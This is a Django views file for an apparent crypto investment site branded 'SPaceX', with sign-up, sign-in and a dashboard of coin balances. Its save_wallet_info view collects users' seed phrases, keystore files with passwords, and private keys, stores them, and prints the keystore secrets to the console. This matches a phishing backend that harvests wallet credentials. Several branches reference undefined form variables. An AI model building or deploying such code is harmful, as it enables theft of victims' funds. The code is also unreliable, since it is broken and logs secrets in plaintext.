# myapp/views.py
from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login
from .forms import SignUpForm, SignInForm, WalletPhraseForm, WalletKeystoreForm, WalletPrivateKeyForm
from django.urls import reverse
from django.shortcuts import render, get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import CustomUser
from django.contrib.auth import logout
from .sendwelcome import send_custom_email
import threading




def index(request):
    return render(request, 'app/index.html')



def signup_view(request):
    if request.method == 'POST':
        form = SignUpForm(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            user_email = user.email
            user_name = user.name
            subject = "Welcome To SPaceX"
            
            # Redirect the user to the dashboard
            response = redirect(reverse('dashboard', args=[user.id]))
            
            # Send email in a separate thread
            threading.Thread(target=send_custom_email, args=(user_email, user_name, subject)).start()
            
            return response
    else:
        form = SignUpForm()
    
    return render(request, 'app/sign-up.html', {'form': form})

def signin_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user is not None:
                login(request, user)
                return redirect(reverse('dashboard', args=[user.id]))
                
            else:
                form.add_error(None, 'Invalid username or password')
        else:
            form.add_error(None, 'Invalid username or password')
    else:
        form = AuthenticationForm()
    
    return render(request, 'app/sign-in.html', {'form': form})



@login_required
def dashboard_view(request, user_id):
    if request.user.id != user_id:
        return redirect('some_error_page')  # Redirect to an error page or raise a permission error

    user = get_object_or_404(CustomUser, id=user_id)
    context = {
        'name': user.name,
        'email': user.email,
        'total_balance': user.total_balance,
        'spc_balance': user.spc_balance,
        'tether_balance': user.tether_balance,
        'btc_balance': user.btc_balance,
        'eth_balance': user.eth_balance,
        'sol_balance': user.sol_balance,
        'binance_balance': user.binance_balance,
        'ripple_balance': user.ripple_balance,
    }

    return render(request, 'app/dashboard.html', context)


def custom_logout_view(request):
    logout(request)
    return redirect('signin')  # Replace 'signin' with the name of your desired redirect page


@login_required
def save_wallet_info(request):
    if request.method == 'POST':
        wallet_name = request.POST.get('walletname')
        
        if 'submit_phrase' in request.POST:
            form = WalletPhraseForm(request.POST)
            if form.is_valid():
                wallet_phrase = form.save(commit=False)
                wallet_phrase.user = request.user
                wallet_phrase.wallet_name = wallet_name
                wallet_phrase.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
        elif 'submit_keystore' in request.POST:
            form = WalletKeystoreForm(request.POST)
            if form.is_valid():
                wallet_keystore = form.save(commit=False)
                wallet_keystore.user = request.user
                wallet_keystore.wallet_name = wallet_name
                print(wallet_keystore.wallet_keystore_json)
                print(wallet_keystore.wallet_keystore_json_password)
                print(wallet_keystore.wallet_name)
                wallet_keystore.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
            else: print("Phrase form errors:", form_phrase.errors)
        elif 'submit_private_key' in request.POST:
            form = WalletPrivateKeyForm(request.POST)
            if form.is_valid():
                wallet_private_key = form.save(commit=False)
                wallet_private_key.user = request.user
                wallet_private_key.wallet_name = wallet_name
                wallet_private_key.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
    else:
        form_phrase = WalletPhraseForm()
        form_keystore = WalletKeystoreForm()
        form_private_key = WalletPrivateKeyForm()
    
    return render(request, 'app/wallet.html', {
        'form_phrase': form_phrase,
        'form_keystore': form_keystore,
        'form_private_key': form_private_key
    })